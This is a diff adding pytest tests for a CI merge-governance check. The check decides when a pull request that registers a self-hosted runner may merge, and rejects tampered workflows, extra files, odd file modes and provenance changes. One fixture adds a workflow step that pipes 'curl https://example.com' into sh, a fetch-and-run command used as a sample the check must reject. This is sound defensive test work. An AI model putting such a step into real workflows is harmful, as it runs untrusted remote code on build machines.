@@ -13,6 +13,7 @@ import io
 import json
 import re
 import runpy
+import subprocess
 import tempfile
 import urllib.request
 from collections.abc import Callable
@@ -838,15 +839,41 @@ def test_lookup_rejects_forks_unregistered_and_missing_runs(
 # ---------------------------------------------------------------------------
 
 
-def exit_git(candidate: str, changed: str) -> Callable[[list[str]], str]:
-    """Return a Git stub that serves one candidate config and diff."""
+def exit_git(
+    candidate: str,
+    changed: str,
+    files: dict[str, str | bytes] | None = None,
+    modes: dict[str, str] | None = None,
+) -> Callable[[list[str]], bytes]:
+    """Return a Git stub that serves one candidate config, files, and diff.
 
-    def git(args: list[str]) -> str:
+    Every path is a plain 100644 blob unless ``modes`` names another mode
+    for one ``revision:path``.
+    """
+    served: dict[str, str | bytes] = {
+        f"{HEAD}:.csarc/config.yml": candidate,
+        **(files or {}),
+    }
+
+    def git(args: list[str]) -> bytes:
         if args[0] == "show":
-            assert args[1] == f"{HEAD}:.csarc/config.yml"
-            return candidate
-        assert args == ["diff", "--name-only", f"{BASE}...{HEAD}"]
-        return changed
+            if args[1] in served:
+                value = served[args[1]]
+                return value if isinstance(value, bytes) else value.encode()
+            raise subprocess.CalledProcessError(128, ["git", *args])
+        if args[0] == "ls-tree":
+            assert args[2] == "--"
+            key = f"{args[1]}:{args[3]}"
+            mode = (modes or {}).get(key, "100644")
+            kind = "commit" if mode == "160000" else "blob"
+            return f"{mode} {kind} {'0' * 40}\t{args[3]}\n".encode()
+        assert args == [
+            "diff",
+            "--no-renames",
+            "--name-only",
+            f"{BASE}...{HEAD}",
+        ]
+        return changed.encode()
 
     return git
 
@@ -928,12 +955,496 @@ def test_no_exit_when_the_base_is_not_self_hosted(tmp_path: Path) -> None:
 
 
 # ---------------------------------------------------------------------------
+# #1317 (ADR Q12): the first registration of an unregistered base.
+# ---------------------------------------------------------------------------
+
+UNREGISTERED = "self_hosted_runner: {}\n"
+UAT_ONLY = CONFIG.replace("- dev\n- uat\n", "- uat\n")
+RUNNER = {"id": "vm-01", "registration": REGISTRATION}
+WORKFLOW_PATH = ".github/workflows/csarc-verify.yml"
+PROVENANCE_PATH = ".csarc/provenance.json"
+REG_RENDER = f".csarc/config.yml\n{WORKFLOW_PATH}\n{PROVENANCE_PATH}\n"
+
+
+def provenance(environments: list[str], runner: object, **extra: object) -> str:
+    """Return a provenance record as a CLI settings update writes it."""
+    context = {
+        "project_mode": "new",
+        "self_hosted_environments": environments,
+        "self_hosted_runner": runner,
+    }
+    return json.dumps(
+        {
+            "applied_at": "2026-10-28T00:00:00Z" if runner else "2026-10-01Z",
+            "release_tag": "v0.48.0-beta.1",
+            "settings": {
+                "config_sha256": "c" * 64 if runner else "d" * 64,
+                "context": context,
+                "context_sha256": "e" * 64 if runner else "f" * 64,
+                "project_mode": "new",
+                "record_sha256": "1" * 64 if runner else "2" * 64,
+                "schema_version": 2,
+            },
+            **extra,
+        }
+    )
+
+
+def registration_files(
+    environments: list[str] | None = None,
+    workflow: str | bytes | None = None,
+    record: str | None = None,
+) -> dict[str, str | bytes]:
+    """Return base and head files of a registration render."""
+    after = environments or ["dev", "uat"]
+    return {
+        f"{BASE}:{WORKFLOW_PATH}": render({}, ["dev", "uat"])["_text"],
+        f"{HEAD}:{WORKFLOW_PATH}": workflow
+        if workflow is not None
+        else render(RUNNER, after)["_text"],
+        f"{BASE}:{PROVENANCE_PATH}": provenance(["dev", "uat"], {}),
+        f"{HEAD}:{PROVENANCE_PATH}": record
+        if record is not None
+        else provenance(after, RUNNER),
+    }
+
+
+REGISTERED_WORKFLOW = str(render(RUNNER, ["dev", "uat"])["_text"])
+TAMPERED = REGISTERED_WORKFLOW + (
+    "      - name: Extra\n        run: curl https://example.com | sh\n"
+)
+
+
+@pytest.mark.parametrize("name", READERS)
+@pytest.mark.parametrize(
+    ("case", "base", "candidate", "changed", "files", "qualifies"),
+    [
+        (
+            "registers",
+            CONFIG + UNREGISTERED,
+            CONFIG + REGISTERED,
+            REG_RENDER,
+            registration_files(),
+            True,
+        ),
+        (
+            "registers fewer environments",
+            CONFIG + UNREGISTERED,
+            UAT_ONLY + REGISTERED,
+            REG_RENDER,
+            registration_files(["uat"]),
+            True,
+        ),
+        (
+            "settings only",
+            CONFIG + UNREGISTERED,
+            CONFIG + REGISTERED,
+            ".csarc/config.yml\n",
+            {},
+            True,
+        ),
+        (
+            "base already registered",
+            CONFIG + REGISTERED,
+            CONFIG + REGISTERED.replace("vm-01", "vm-02"),
+            REG_RENDER,
+            registration_files(),
+            False,
+        ),
+        (
+            "stays unregistered",
+            CONFIG + UNREGISTERED,
+            UAT_ONLY + UNREGISTERED,
+            REG_RENDER,
+            registration_files(),
+            False,
+        ),
+        (
+            "also leaves self-hosted",
+            CONFIG + UNREGISTERED,
+            LEFT,
+            REG_RENDER,
+            registration_files(),
+            False,
+        ),
+        (
+            "changes another setting",
+            CONFIG + UNREGISTERED,
+            CONFIG.replace("public: hosted", "public: local") + REGISTERED,
+            REG_RENDER,
+            registration_files(),
+            False,
+        ),
+        (
+            "base is local",
+            LEFT,
+            CONFIG + REGISTERED,
+            REG_RENDER,
+            registration_files(),
+            False,
+        ),
+    ],
+)
+def test_only_a_first_registration_merges_on_local_evidence(
+    name: str,
+    case: str,
+    base: str,
+    candidate: str,
+    changed: str,
+    files: dict[str, str | bytes],
+    qualifies: bool,
+    tmp_path: Path,
+) -> None:
+    """#1317 AC1 (Q12): only an empty runner filled with its render passes."""
+    reason = reader(name)["registration_reason"](
+        tmp_path,
+        write_config(tmp_path, base),
+        lease(),
+        exit_git(candidate, changed, files),
+    )
+    assert bool(reason) is qualifies, case
+    if qualifies:
+        assert reason == (
+            "the pull request only registers self_hosted_runner vm-01 "
+            f"({REGISTRATION}) on an unregistered self-hosted base (ADR Q12)"
+        )
+
+
+@pytest.mark.parametrize("name", READERS)
+@pytest.mark.parametrize(
+    ("case", "changed", "files", "rejected"),
+    [
+        (
+            "product code",
+            REG_RENDER + "src/app.py\n",
+            registration_files(),
+            "src/app.py",
+        ),
+        (
+            "AGENTS.md",
+            REG_RENDER + "AGENTS.md\n",
+            registration_files(),
+            "AGENTS",
+        ),
+        (
+            "a trusted script",
+            REG_RENDER + ".csarc/scripts/verify-fast\n",
+            registration_files(),
+            ".csarc/scripts/verify-fast",
+        ),
+        (
+            "another workflow",
+            REG_RENDER + ".github/workflows/other.yml\n",
+            registration_files(),
+            "other.yml",
+        ),
+        (
+            "an extra workflow step",
+            REG_RENDER,
+            registration_files(workflow=TAMPERED),
+            WORKFLOW_PATH,
+        ),
+        (
+            "a workflow for another runner",
+            REG_RENDER,
+            registration_files(
+                workflow=render(
+                    {"id": "vm-02", "registration": REGISTRATION},
+                    ["dev", "uat"],
+                )["_text"]
+            ),
+            WORKFLOW_PATH,
+        ),
+        (
+            "CRLF line endings in the workflow",
+            REG_RENDER,
+            registration_files(
+                workflow=REGISTERED_WORKFLOW.replace("\n", "\r\n").encode()
+            ),
+            WORKFLOW_PATH,
+        ),
+        (
+            "a lone CR in the workflow",
+            REG_RENDER,
+            registration_files(
+                workflow=REGISTERED_WORKFLOW.replace(
+                    "permissions:\n", "permissions:\r\n", 1
+                ).encode()
+            ),
+            WORKFLOW_PATH,
+        ),
+        (
+            "a new final plan digest",
+            REG_RENDER,
+            registration_files(
+                record=provenance(
+                    ["dev", "uat"], RUNNER, final_plan_sha256="9" * 64
+                )
+            ),
+            PROVENANCE_PATH,
+        ),
+        (
+            "a provenance release change",
+            REG_RENDER,
+            registration_files(
+                record=provenance(["dev", "uat"], RUNNER, release_tag="v9")
+            ),
+            PROVENANCE_PATH,
+        ),
+        (
+            "a provenance context change",
+            REG_RENDER,
+            registration_files(
+                record=provenance(["dev", "uat"], RUNNER).replace(
+                    '"project_mode": "new", "self', '"project_mode": "x", "self'
+                )
+            ),
+            PROVENANCE_PATH,
+        ),
+    ],
+)
+def test_registration_with_anything_more_fails_closed(
+    name: str,
+    case: str,
+    changed: str,
+    files: dict[str, str | bytes],
+    rejected: str,
+    tmp_path: Path,
+) -> None:
+    """#1317 AC1/R1: a registration that carries more raises with the path."""
+    with pytest.raises(
+        RuntimeError, match="Self-hosted registration: "
+    ) as error:
+        reader(name)["registration_reason"](
+            tmp_path,
+            write_config(tmp_path, CONFIG + UNREGISTERED),
+            lease(),
+            exit_git(CONFIG + REGISTERED, changed, files),
+        )
+    assert rejected in str(error.value), case
+    assert "(ADR Q12)" in str(error.value)
+
+
+@pytest.mark.parametrize("name", READERS)
+@pytest.mark.parametrize(
+    ("path", "revision", "mode"),
+    [
+        (WORKFLOW_PATH, HEAD, "120000"),
+        (WORKFLOW_PATH, HEAD, "100755"),
+        (PROVENANCE_PATH, HEAD, "120000"),
+        (".csarc/config.yml", HEAD, "120000"),
+        (".csarc/config.yml", HEAD, "100755"),
+        (WORKFLOW_PATH, BASE, "100755"),
+    ],
+)
+def test_registration_needs_plain_files_on_both_sides(
+    name: str, path: str, revision: str, mode: str, tmp_path: Path
+) -> None:
+    """#1317 review B: a symlink or executable bit never passes."""
+    with pytest.raises(RuntimeError, match="not a plain 100644 file") as error:
+        reader(name)["registration_reason"](
+            tmp_path,
+            write_config(tmp_path, CONFIG + UNREGISTERED),
+            lease(),
+            exit_git(
+                CONFIG + REGISTERED,
+                REG_RENDER,
+                registration_files(),
+                {f"{revision}:{path}": mode},
+            ),
+        )
+    assert f"registration: {path}" in str(error.value)
+
+
+@pytest.mark.parametrize("name", READERS)
+@pytest.mark.parametrize(
+    ("before", "after", "qualifies"),
+    [
+        ({"final_plan_sha256": "8" * 64}, {}, True),
+        (
+            {"final_plan_sha256": "8" * 64},
+            {"final_plan_sha256": "8" * 64},
+            True,
+        ),
+        (
+            {"final_plan_sha256": "8" * 64},
+            {"final_plan_sha256": "9" * 64},
+            False,
+        ),
+        ({}, {"final_plan_sha256": "9" * 64}, False),
+    ],
+)
+def test_registration_never_plants_a_final_plan_digest(
+    name: str,
+    before: dict[str, str],
+    after: dict[str, str],
+    qualifies: bool,
+    tmp_path: Path,
+) -> None:
+    """#1317 review C: the plan digest may stay or go, never change."""
+    files = {
+        **registration_files(),
+        f"{BASE}:{PROVENANCE_PATH}": provenance(["dev", "uat"], {}, **before),
+        f"{HEAD}:{PROVENANCE_PATH}": provenance(
+            ["dev", "uat"], RUNNER, **after
+        ),
+    }
+    check = reader(name)["registration_reason"]
+    arguments = (
+        tmp_path,
+        write_config(tmp_path, CONFIG + UNREGISTERED),
+        lease(),
+        exit_git(CONFIG + REGISTERED, REG_RENDER, files),
+    )
+    if qualifies:
+        assert "(ADR Q12)" in check(*arguments)
+    else:
+        with pytest.raises(RuntimeError, match="provenance"):
+            check(*arguments)
+
+
+@pytest.mark.parametrize("name", READERS)
+def test_registration_fails_closed_on_an_unreadable_candidate(
+    name: str, tmp_path: Path
+) -> None:
+    """#1317 AC1: a candidate the base cannot read never qualifies."""
+
+    def broken(args: list[str]) -> str:
+        raise subprocess.CalledProcessError(128, args)
+
+    base = write_config(tmp_path, CONFIG + UNREGISTERED)
+    assert (
+        reader(name)["registration_reason"](tmp_path, base, lease(), broken)
+        == ""
+    )
+
+
+def run_git(repo: Path, *args: str) -> str:
+    """Run one Git command in a scratch repository."""
+    return subprocess.run(  # noqa: S603 - fixed git arguments
+        ["git", "-C", str(repo), *args],  # noqa: S607
+        capture_output=True,
+        text=True,
+        check=True,
+    ).stdout.strip()
+
+
+def renamed_repository(
+    tmp_path: Path, base: str, candidate: str
+) -> dict[str, Any]:
+    """Commit a base, then a head that moves product code into .github/."""
+    repo = tmp_path / "repo"
+    (repo / ".csarc").mkdir(parents=True)
+    (repo / "src").mkdir()
+    run_git(tmp_path, "init", "-q", str(repo))
+    run_git(repo, "config", "user.email", "test@example.com")
+    run_git(repo, "config", "user.name", "Test")
+    (repo / ".csarc/config.yml").write_text(base, encoding="utf-8")
+    (repo / "src/app.py").write_text("print('product')\n", encoding="utf-8")
+    run_git(repo, "add", "-A")
+    run_git(repo, "commit", "-q", "-m", "base")
+    base_sha = run_git(repo, "rev-parse", "HEAD")
+    (repo / ".github").mkdir()
+    run_git(repo, "mv", "src/app.py", ".github/app.py")
+    (repo / ".csarc/config.yml").write_text(candidate, encoding="utf-8")
+    run_git(repo, "add", "-A")
+    run_git(repo, "commit", "-q", "-m", "head")
+    # Rename detection alone would list only .github/app.py.
+    assert run_git(
+        repo, "diff", "--name-only", f"{base_sha}...HEAD"
+    ).splitlines() == [".csarc/config.yml", ".github/app.py"]
+    return {
+        "repo": repo,
+        "lease": {
+            **lease(),
+            "base_sha": base_sha,
+            "head_sha": run_git(repo, "rev-parse", "HEAD"),
+        },
+    }
+
+
+@pytest.mark.parametrize("name", READERS)
+@pytest.mark.parametrize("ending", [b"\n", b"\r\n"])
+def test_registration_compares_real_git_bytes(
+    name: str, ending: bytes, tmp_path: Path
+) -> None:
+    """#1317 review A: CRLF in a committed workflow is not the render."""
+    repo = tmp_path / "repo"
+    (repo / ".csarc").mkdir(parents=True)
+    (repo / ".github/workflows").mkdir(parents=True)
+    run_git(tmp_path, "init", "-q", str(repo))
+    for key, value in (
+        ("user.email", "test@example.com"),
+        ("user.name", "Test"),
+        ("core.autocrlf", "false"),
+    ):
+        run_git(repo, "config", key, value)
+    files = registration_files()
+    (repo / ".csarc/config.yml").write_text(
+        CONFIG + UNREGISTERED, encoding="utf-8"
+    )
+    (repo / WORKFLOW_PATH).write_text(
+        str(files[f"{BASE}:{WORKFLOW_PATH}"]), encoding="utf-8"
+    )
+    run_git(repo, "add", "-A")
+    run_git(repo, "commit", "-q", "-m", "base")
+    base_sha = run_git(repo, "rev-parse", "HEAD")
+    (repo / ".csarc/config.yml").write_text(
+        CONFIG + REGISTERED, encoding="utf-8"
+    )
+    (repo / WORKFLOW_PATH).write_bytes(
+        str(files[f"{HEAD}:{WORKFLOW_PATH}"]).encode().replace(b"\n", ending)
+    )
+    run_git(repo, "add", "-A")
+    run_git(repo, "commit", "-q", "-m", "head")
+    held = {
+        **lease(),
+        "base_sha": base_sha,
+        "head_sha": run_git(repo, "rev-parse", "HEAD"),
+    }
+    check = reader(name)["registration_reason"]
+    config = write_config(tmp_path, CONFIG + UNREGISTERED)
+    if ending == b"\n":
+        assert "(ADR Q12)" in check(repo, config, held)
+    else:
+        with pytest.raises(RuntimeError, match="csarc-verify"):
+            check(repo, config, held)
+
+
+@pytest.mark.parametrize("name", READERS)
+def test_a_rename_into_an_allowed_directory_never_qualifies(
+    name: str, tmp_path: Path
+) -> None:
+    """#1317 review: both sides of a move are checked for Q1 and Q12."""
+    exit_case = renamed_repository(tmp_path / "q1", CONFIG + REGISTERED, LEFT)
+    assert (
+        reader(name)["exit_reason"](
+            exit_case["repo"],
+            write_config(tmp_path, CONFIG + REGISTERED),
+            exit_case["lease"],
+        )
+        == ""
+    )
+    registration = renamed_repository(
+        tmp_path / "q12", CONFIG + UNREGISTERED, CONFIG + REGISTERED
+    )
+    with pytest.raises(RuntimeError, match=r"src/app\.py"):
+        reader(name)["registration_reason"](
+            registration["repo"],
+            write_config(tmp_path, CONFIG + UNREGISTERED),
+            registration["lease"],
+        )
+
+
+# ---------------------------------------------------------------------------
 # AC3: merge snapshot, evidence trust, and trace through the lifecycle.
 # ---------------------------------------------------------------------------
 
 
 def use_self_hosted_mode(
-    monkeypatch: pytest.MonkeyPatch, exit_reason: str = ""
+    monkeypatch: pytest.MonkeyPatch,
+    exit_reason: str = "",
+    registration_reason: str = "",
 ) -> dict[str, Any]:
     """Select self-hosted with local governance and stubbed VM evidence."""
     use_local_mode(monkeypatch)
@@ -963,6 +1474,9 @@ def use_self_hosted_mode(
     )
     sibling = MODULE["self_hosted_evidence"]
     monkeypatch.setattr(sibling, "exit_reason", lambda *_: exit_reason)
+    monkeypatch.setattr(
+        sibling, "registration_reason", lambda *_: registration_reason
+    )
     monkeypatch.setattr(sibling, "require", lambda *_: evidence)
     return evidence
 
@@ -1010,6 +1524,63 @@ def test_self_hosted_exit_merges_on_local_evidence_with_its_reason(
         "self-hosted-exit-trace: pr=42 trust=self-attested-local because it "
         "only leaves self-hosted (ADR Q1)"
     ) in lines
+
+
+def use_unregistered_base(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, changed: str
+) -> dict[str, Any]:
+    """Run the real Q1 and Q12 checks against an unregistered base."""
+    bind_remote_lease(monkeypatch)
+    use_self_hosted_mode(monkeypatch)
+    sibling = MODULE["self_hosted_evidence"]
+    base = write_config(tmp_path, CONFIG + UNREGISTERED)
+    stub = exit_git(CONFIG + REGISTERED, changed, registration_files())
+    real = reader("root")
+    for function in ("exit_reason", "registration_reason"):
+        monkeypatch.setattr(
+            sibling,
+            function,
+            lambda subject, _config, held, f=function: real[f](
+                subject, base, held, stub
+            ),
+        )
+
+    def no_vm(*_args: object) -> None:
+        raise real["unregistered"]()
+
+    monkeypatch.setattr(sibling, "require", no_vm)
+    return real
+
+
+def test_unregistered_base_merges_its_registration_pull_request(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    """#1317 AC2: lifecycle merges the registration PR on local evidence."""
+    use_unregistered_base(monkeypatch, tmp_path, REG_RENDER)
+    snapshot = merge_snapshot(
+        SingleWriterGitHub(), lease_fixture(), AUTHORIZATION_URL
+    )
+    assert snapshot["self_hosted_verification"] is None
+    assert snapshot["self_hosted_exit"] == ""
+    assert snapshot["required_check_evidence"] == "local-self-attested"
+    _payload, trust = MODULE["merge_evidence"](snapshot, lease_fixture())
+    assert trust == "self-attested-local"
+    lines = MODULE["trace_lines"](snapshot, lease_fixture(), "pr=42")
+    assert (
+        "self-hosted-registration-trace: pr=42 trust=self-attested-local "
+        "because the pull request only registers self_hosted_runner vm-01 "
+        f"({REGISTRATION}) on an unregistered self-hosted base (ADR Q12)"
+    ) in lines
+    assert not any(line.startswith("self-hosted-exit-trace") for line in lines)
+
+
+def test_unregistered_base_still_fails_closed_for_other_changes(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    """#1317 AC1/R1: any other PR on an unregistered base stays blocked."""
+    use_unregistered_base(monkeypatch, tmp_path, REG_RENDER + "src/app.py\n")
+    with pytest.raises(RuntimeError, match="Self-hosted registration: src/app"):
+        merge_snapshot(SingleWriterGitHub(), lease_fixture(), AUTHORIZATION_URL)
 
 
 @pytest.mark.parametrize("name", ["root", "template"])
